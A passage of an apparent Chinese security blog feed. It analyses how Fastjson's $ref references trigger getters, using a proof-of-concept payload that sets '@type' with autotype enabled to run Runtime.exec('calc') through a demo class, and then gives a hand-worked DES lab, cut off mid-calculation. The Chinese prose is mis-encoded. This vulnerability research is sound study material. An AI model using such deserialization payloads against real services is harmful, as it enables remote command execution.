class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> kiloã€å†°å®¤/ki10Moc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/11/14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span> 0:10</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span> http://ki10.top</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;[&#123;\&quot;@type\&quot;:\&quot;org.example.Test\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;,&#123;\&quot;$ref\&quot;:\&quot;$[0].cmd\&quot;&#125;]&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> kiloã€å†°å®¤/ki10Moc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/11/14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span> 0:06</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span> http://ki10.top</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCmd</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/dc6850c866f6481dace57ebac550a4fb.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>é¦–å…ˆå°±æ˜¯æˆ‘ä»¬è¦å¼„æ¸…è¯¥ <code>payload</code>  ï¼Œå°±éœ€è¦çŸ¥é“ <code>[&#123;\&quot;@type\&quot;:\&quot;org.example.Test\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;,&#123;\&quot;$ref\&quot;:\&quot;$[0].cmd\&quot;&#125;]</code>  ref çš„ä½œç”¨</p><p><img src="https://img-blog.csdnimg.cn/ab171b9139874091a82122c3fad6eb83.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‰“ä¸Šæ–­ç‚¹æ¥ debug ä¸‹</p><p>é¦–å…ˆæ˜¯ <code>handleResovleTask</code></p><p>è¿™é‡Œæ˜¯å¤„ç† <code>refvalue</code>  çš„åœ°æ–¹</p><p>é¦–å…ˆåˆ¤æ–­æ˜¯å¦æ˜¯<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>å¼€å¤´ï¼Œç„¶åè·å–å¯¹è±¡ï¼Œæœ€åç¡®å®š</mtext><mi>r</mi><mi>e</mi><mi>f</mi><mtext>ï¼š</mtext><mi mathvariant="normal">â€˜</mi></mrow><annotation encoding="application/x-tex">å¼€å¤´ï¼Œç„¶åè·å–å¯¹è±¡ï¼Œæœ€åç¡®å®šrefï¼š`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">å¼€</span><span class="mord cjk_fallback">å¤´</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">ç„¶</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">è·</span><span class="mord cjk_fallback">å–</span><span class="mord cjk_fallback">å¯¹</span><span class="mord cjk_fallback">è±¡</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord cjk_fallback">æœ€</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">ç¡®</span><span class="mord cjk_fallback">å®š</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord cjk_fallback">ï¼š</span><span class="mord">â€˜</span></span></span></span>[0].cmd`</p><p><code>$[0]</code>  è¡¨ç¤ºçš„æ˜¯æ•°ç»„é‡Œçš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œåˆ™ <code>$[0].cmd</code>  è¡¨ç¤ºçš„æ˜¯è·å–ç¬¬ä¸€ä¸ªå…ƒç´ çš„ cmd å±æ€§çš„å€¼ã€‚</p><p><img src="https://img-blog.csdnimg.cn/fdb0c42566414e3591b78f1d191acdc8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ¥çœ‹ <code>getObject()</code></p><p><img src="https://img-blog.csdnimg.cn/751616c24c5f457da87a714592975f71.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è·å–æ•°ç»„ï¼Œç¬¬ 0 ä¸ªä½ <code>$</code>  ï¼Œç¬¬ 1 ä¸ªä¸º <code>$[0]</code>  å¹¶è¿”å›è¯¥å¯¹è±¡</p><p>ä¸‹é¢æ˜¯ <code>JSONPath.eval()</code></p><p><img src="https://img-blog.csdnimg.cn/26884761543445938984c316e180dd68.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç»§ç»­è·Ÿè¿› <code>compile()</code></p><p><img src="https://img-blog.csdnimg.cn/898491946cbf4d85a6c4be251c380780.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œè·¯å¾„ä¸ä¸ºç©ºï¼Œä¸ä¼šæŠ›å‡ºå¼‚å¸¸</p><p><img src="https://img-blog.csdnimg.cn/e8dbe9b8ad8c4c1799c94e66cb9057d9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ¥ç€è·Ÿè¿› <code>eval</code>  ä¸‹çš„ <code>init()</code></p><p><img src="https://img-blog.csdnimg.cn/664019ba77384d2b825bd7318ec416fa.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œ segments ä¸ºç©ºï¼Œç»§ç»­å¾€ä¸‹èµ°</p><p><img src="https://img-blog.csdnimg.cn/18ab23cb8a31429ab519f60a356a591e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åœ¨è°ƒç”¨ <code>parser.explain()</code>  æ–¹æ³•å‰ <code>segments</code>  ä¸ºç©º</p><p><img src="https://img-blog.csdnimg.cn/28d9f9f3afbf4d2a96dfc9db42d162dd.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><code>Segement[]</code>  åˆå§‹é•¿åº¦ä¸º 8ï¼Œå› ä¸ºå…¶æ¥å£ä¸€å…±æœ‰ 8 ä¸ª</p><p><img src="https://img-blog.csdnimg.cn/e60e37f4682847d78af2d7a9ad4ac0c5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/36139b0c68da4c61a6d3d5901ed056b8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œ <code>segment</code>  å€¼å°±å˜æˆäº† <code>JSONPath</code></p><p><img src="https://img-blog.csdnimg.cn/78b0c4eb78764b249e060612f04373dc.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¾ªç¯è¿½åŠ åˆ° <code>StringBuilder</code>  åé¢</p><p><img src="https://img-blog.csdnimg.cn/7f08963a6fb2456db9098255b6b28de4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç„¶åæŒ‰é¡ºåºæ‰§è¡Œå‰é¢ <code>explain</code>  () ç”Ÿæˆçš„ <code>Segment array</code></p><p>æœ€ç»ˆåœ¨ <code>getPropertyValue()</code>  åå°„è°ƒç”¨ <code>get()</code></p><p>è‡³æ­¤ï¼Œå°±å®Œæˆäº†ä¸ä½¿ç”¨ <code>JSON.parseObect()</code>  ä¹Ÿèƒ½è°ƒç”¨ <code>get()</code>  çš„æ–¹æ³•</p><p>æœ€åå¯ä»¥çœ‹ä¸‹ Y4 å¸ˆå‚…çš„</p><p><a href="https://blog.csdn.net/solitudi/article/details/120275526?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166824314316782425171350%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=166824314316782425171350&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-120275526-null-null.nonecase&amp;utm_term=ref&amp;spm=1018.2226.3001.4450">[Java å®‰å…¨] Fastjsonï¼=1.2.36$ref å¼•ç”¨å¯è§¦å‘ get æ–¹æ³•åˆ†æ_Y4tacker çš„åšå®¢ - CSDN åšå®¢_fastjson get æ–¹æ³•</a></p><h2 id="0x05-å‚è€ƒ"><a class="markdownIt-Anchor" href="#0x05-å‚è€ƒ">#</a> 0x05 å‚è€ƒ</h2><p><a href="https://blog.csdn.net/solitudi/article/details/120275526?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166824314316782425171350%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=166824314316782425171350&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-120275526-null-null.nonecase&amp;utm_term=ref&amp;spm=1018.2226.3001.4450">[Java å®‰å…¨] Fastjsonï¼=1.2.36$ref å¼•ç”¨å¯è§¦å‘ get æ–¹æ³•åˆ†æ_Y4tacker çš„åšå®¢ - CSDN åšå®¢_fastjson get æ–¹æ³•</a></p><p><a href="https://www.cnblogs.com/R0ser1/p/15918626.html#%E4%BB%80%E4%B9%88%E6%98%AFref">fastjson ä¸å‡ºç½‘å­¦ä¹  - R0ser1 - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://ccship.cn/2021/12/21/fastjson%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bbasicdatasource%e5%88%a9%e7%94%a8%e9%93%be/">FastJson ååºåˆ—åŒ–ä¹‹ BasicDataSource åˆ©ç”¨é“¾ â€“ cc (ccship.cn)</a></p><p><a href="https://blog.play2win.top/2021/11/25/fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E7%AE%80%E6%9E%90/">fastjson ä¸å‡ºç½‘åˆ©ç”¨ç®€æ - P1ay2winâ€™s blog (play2win.top)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;æœ¬æ–‡é¦–å‘äºå¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒºå¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-æµ…æfastjsonä¸å‡ºç½‘åˆ©ç”¨æ–¹å¼-butiannet&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#æœ¬æ–‡é¦–å‘äºå¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒºå¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-æµ…æfastjsonä¸å‡ºç½‘åˆ©ç”¨æ–¹å¼-butiannet</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Javaå®‰å…¨" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="FastJson" scheme="https://ki10moc.github.io/tags/FastJson/"/>
    
  </entry>
  
  <entry>
    <title>ä¿¡å®‰å®éªŒ-DES(å¤‡è¯¾)</title>
    <link href="https://ki10moc.github.io/2022/09/26/%E4%BF%A1%E5%AE%89%E5%AE%9E%E9%AA%8C-DES(%E5%A4%87%E8%AF%BE)/"/>
    <id>https://ki10moc.github.io/2022/09/26/%E4%BF%A1%E5%AE%89%E5%AE%9E%E9%AA%8C-DES(%E5%A4%87%E8%AF%BE)/</id>
    <published>2022-09-26T14:02:17.000Z</published>
    <updated>2022-09-26T14:03:53.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="desåŠ å¯†"><a class="markdownIt-Anchor" href="#desåŠ å¯†">#</a> DES åŠ å¯†</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ˜æ–‡M=(<span class="number">0123456789</span>ABCDEF)<span class="number">16</span>=(<span class="number">00000001</span> <span class="number">00100011</span> <span class="number">01000101</span> <span class="number">01100111</span> <span class="number">10001001</span> <span class="number">10101011</span> <span class="number">11001101</span> <span class="number">11101111</span>)<span class="number">2</span></span><br><span class="line">å¯†é’¥K=ï¼ˆ<span class="number">133457799</span>BBCDFF1ï¼‰<span class="number">16</span>=(<span class="number">00010011</span> <span class="number">00110100</span> <span class="number">01010111</span> <span class="number">01111001</span> <span class="number">10011011</span> <span class="number">10111100</span> <span class="number">11011111</span> <span class="number">11110001</span>)<span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="ç§˜é’¥çš„è®¡ç®—"><a class="markdownIt-Anchor" href="#ç§˜é’¥çš„è®¡ç®—">#</a> ç§˜é’¥çš„è®¡ç®—</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">K=<span class="number">00010011</span> <span class="number">00110100</span> <span class="number">01010111</span> <span class="number">01111001</span> <span class="number">10011011</span> <span class="number">10111100</span> <span class="number">11011111</span> <span class="number">11110001</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/5a329385cb94465a98992859e6b42bdb.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/8258fa37be9148139c7b868e496b4f6b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‹ç¼©ç½®æ¢ 1ï¼š</p><p>00010011 8<br>00110100 16<br>01010111 24<br>01111001 32<br>10011011 40<br>10111100 48<br>11011111 56<br>11110001 64</p><p><img src="https://img-blog.csdnimg.cn/141f6f7d9c6e4302ae8a4926d140bdb0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŒ‰ç…§è¡¨æ ¼é€‰å‡ºä¸Šè¿°æ•°å­—</p><p>1111000<br>0110011<br>0010101<br>0101111<br>0101010<br>1011001<br>1001111<br>0001111</p><p>å¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">K0=<span class="number">11110000110011001010101011110101010101100110011110001111</span></span><br></pre></td></tr></table></figure><p>æ‹†åˆ†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C0=<span class="number">1111000011001100101010101111</span></span><br><span class="line">D0=<span class="number">0101010101100110011110001111</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€è½®ï¼Œå·¦ç§» 1 ä½</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C1=<span class="number">1110000110011001010101011111</span></span><br><span class="line">D1=<span class="number">1010101011001100111100011110</span></span><br></pre></td></tr></table></figure><p>åˆå¹¶å¾—åˆ°æ–°çš„å­ç§˜é’¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C1D1=<span class="number">11100001100110010101010111111010101011001100111100011110</span></span><br></pre></td></tr></table></figure><p>å‹ç¼©ç½®æ¢ 2ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1110000</span>  <span class="number">7</span>    </span><br><span class="line"><span class="number">1100110</span>  <span class="number">14</span></span><br><span class="line"><span class="number">0101010</span>  <span class="number">21</span></span><br><span class="line"><span class="number">1011111</span>  <span class="number">28</span></span><br><span class="line"><span class="number">1010101</span>  <span class="number">35</span></span><br><span class="line"><span class="number">0110011</span>  <span class="number">42</span></span><br><span class="line"><span class="number">0011110</span>  <span class="number">49</span></span><br><span class="line"><span class="number">0011110</span>  <span class="number">56</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/f5f925ba28e24e34ac90f51ef2a5ca86.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ ¹æ®å‹ç¼©ç½®æ¢ 2 è¡¨å¾—åˆ° K1ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">000110</span></span><br><span class="line"><span class="number">110000</span></span><br><span class="line"><span class="number">001011</span></span><br><span class="line"><span class="number">101111</span></span><br><span class="line"><span class="number">111111</span></span><br><span class="line"><span class="number">000111</span></span><br><span class="line"><span class="number">000001</span></span><br><span class="line"><span class="number">110010</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">K1</span>(<span class="number">48</span>)= <span class="number">00011011</span> <span class="number">00000010</span> <span class="number">11101111</span> <span class="number">11111100</span> <span class="number">01110000</span> <span class="number">01110010</span></span><br></pre></td></tr></table></figure><h3 id="åˆå§‹è½¬æ¢"><a class="markdownIt-Anchor" href="#åˆå§‹è½¬æ¢">#</a> åˆå§‹è½¬æ¢</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M=<span class="number">00000001</span> <span class="number">00100011</span> <span class="number">01000101</span> <span class="number">01100111</span> <span class="number">10001001</span> <span class="number">10101011</span> <span class="number">11001101</span> <span class="number">11101111</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">00000001</span> </span><br><span class="line"><span class="number">00100011</span> </span><br><span class="line"><span class="number">01000101</span> </span><br><span class="line"><span class="number">01100111</span> </span><br><span class="line"><span class="number">10001001</span> </span><br><span class="line"><span class="number">10101011</span> </span><br><span class="line"><span class="number">11001101</span> </span><br><span class="line"><span class="number">11101111</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/e3cf910b01294c3399b5b9a2618482a1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ ¹æ®åˆå§‹ç½®æ¢è¡¨è½¬æ¢ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000001</span> <span class="number">8</span></span><br><span class="line"><span class="number">00100011</span> <span class="number">16</span></span><br><span class="line"><span class="number">01000101</span> <span class="number">24</span></span><br><span class="line"><span class="number">01100111</span> <span class="number">32</span></span><br><span class="line"><span class="number">10001001</span> <span class="number">40</span></span><br><span class="line"><span class="number">10101011</span> <span class="number">48</span></span><br><span class="line"><span class="number">11001101</span> <span class="number">56</span></span><br><span class="line"><span class="number">11101111</span> <span class="number">64</span></span><br></pre></td></tr></table></figure><p>ç½®æ¢å¾—åˆ°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11001100</span></span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">11001100</span></span><br><span class="line"><span class="number">11111111</span></span><br><span class="line"><span class="number">11110000</span></span><br><span class="line"><span class="number">10101010</span></span><br><span class="line"><span class="number">11110000</span></span><br><span class="line"><span class="number">10101010</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M=<span class="number">11001100</span> <span class="number">00000000</span> <span class="number">11001100</span> <span class="number">11111111</span> <span class="number">11110000</span> <span class="number">10101010</span> <span class="number">11110000</span> <span class="number">10101010</span></span><br></pre></td></tr></table></figure><p>åˆ†ä¸ºå·¦å³ä¸¤éƒ¨åˆ†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">L0=<span class="number">11001100</span> <span class="number">00000000</span> <span class="number">11001100</span> <span class="number">11111111</span></span><br><span class="line">R0=<span class="number">11110000</span> <span class="number">10101010</span> <span class="number">11110000</span> <span class="number">10101010</span></span><br></pre></td></tr></table></figure><h3 id="æ‰©å±•ç½®æ¢"><a class="markdownIt-Anchor" href="#æ‰©å±•ç½®æ¢">#</a> æ‰©å±•ç½®æ¢</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R0=<span class="number">11110000</span> <span class="number">10101010</span> <span class="number">11110000</span> <span class="number">10101010</span></span><br></pre></td></tr></table></figure><p>åˆ†ç»„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1111</span> </span><br><span class="line">    <span class="number">0000</span> </span><br><span class="line">        <span class="number">1010</span> </span><br><span class="line">            <span class="number">1010</span> </span><br><span class="line">    <span class="number">1111</span> </span><br><span class="line">    <span class="number">0000</span> </span><br><span class="line">    <span class="number">1010</span> </span><br><span class="line">    <span class="number">1010</span></span><br></pre></td></tr></table></figure><p>æ‹“å±•ç½®æ¢å¾—åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">011110 </span><br><span class="line">    <span class="number">100001</span> </span><br><span class="line">        <span class="number">0</span>10101 </span><br><span class="line">            <span class="number">0</span>10101 </span><br><span class="line">    011110 </span><br><span class="line">    <span class="number">100001</span> </span><br><span class="line">    <span class="number">0</span>10101 </span><br><span class="line">    <span class="number">0</span>10101</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E(R0)<span class="number">48</span>=01111010 <span class="number">000</span>10101 <span class="number">0</span>1010101 01111010 <span class="number">000</span>10101 <span class="number">0</span>1010101</span><br></pre></td></tr></table></figure><p>R048=E (R0) å¼‚æˆ– K1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">K1(<span class="number">48</span>)= 00011011 <span class="number">000000</span>10 <span class="number">11101111</span> <span class="number">11111100</span> 01110000 01110010  </span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R0(<span class="number">48</span>)=01100001 <span class="number">000</span>10111 <span class="number">10111010</span> <span class="number">10000110</span> 01100101 <span class="number">00</span>100111</span><br></pre></td></tr></table></figure><h3 id="sç›’æ›¿æ¢"><a class="markdownIt-Anchor" href="#sç›’æ›¿æ¢">#</a> S ç›’æ›¿æ¢</h3><p>å°† R0 åˆ†ç»„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">011000</span><br><span class="line"><span class="number">0</span>10001</span><br><span class="line">011110</span><br><span class="line"><span class="number">111010</span></span><br><span class="line"><span class="number">100001</span></span><br><span class="line"><span class="number">100110</span></span><br><span class="line"><span class="number">0</span>10100</span><br><span class="line"><span class="number">100111</span></span><br></pre></td></tr></table></figure><p>æ‰©å±•ä½äºŒè¿›åˆ¶è½¬åè¿›åˆ¶ï¼ŒåŸä½äºŒè¿›åˆ¶è½¬ä¸ºåè¿›åˆ¶ï¼Œå¯¹åº”è¡¨æ ¼ä¸­æ•°å­—è½¬ä¸ºäºŒè¿›åˆ¶</p><table><thead><tr><th>ç»„</th><th>åˆ—</th><th>å€¼</th></tr></thead><tbody><tr><td>S1: 00=0</td><td>1100=12</td><td>5=0101</td></tr><tr><td>S2:01=1</td><td>1000=8</td><td>12=1100</td></tr></tbody></table><p><img src="https://img-blog.csdnimg.cn/a018a0a03c624fcd864a96a3e1bbf815.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><table><thead><tr><th>ç»„</th><th>åˆ—</th><th>å€¼</th></tr></thead><tbody><tr><td>S3ï¼š00=0</td><td>1111=15</td><td>8=1000</td></tr><tr><td>S4ï¼š10=2</td><td>1101=13</td><td>2=0010</td></tr></tbody></table><p><img src="https://img-blog.csdnimg.cn/4e5d0dd0e418412cad3b1af3b89bff6c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><table><thead><tr><th>ç»„</th><th>åˆ—</th><th>å€¼</th></tr></thead><tbody><tr><td>S5ï¼š11=3</td><td>0000=0</td><td>11=1011</td></tr><tr><td>S6ï¼š10=2</td><td>0011=3</td><td>5=0101</td></tr></tbody></table><p><img src="https://img-blog.csdnimg.cn/191b04bf663540808826c522bd0b79c2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><table><thead><tr><th>ç»„</th><th>åˆ—</th><th>å€¼</th></tr></thead><tbody><tr><td>S7ï¼š00=0</td><td>1010=10</td><td>9=1001</td></tr><tr><td>S8ï¼š11=3</td><td>0011=3</td><td>7=0111</td></tr></tbody></table><p><img src="https://img-blog.csdnimg.cn/65568edcdd1543d68e395157b854a99b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœ€ç»ˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S1(011000)=<span class="number">0</span>101, S2(<span class="number">0</span>10001)=<span class="number">1100</span>, S3(011110)=<span class="number">1000</span>, S4(<span class="number">111010</span>)=<span class="number">00</span>10 S5(<span class="number">100001</span>)=<span class="number">1011</span>, 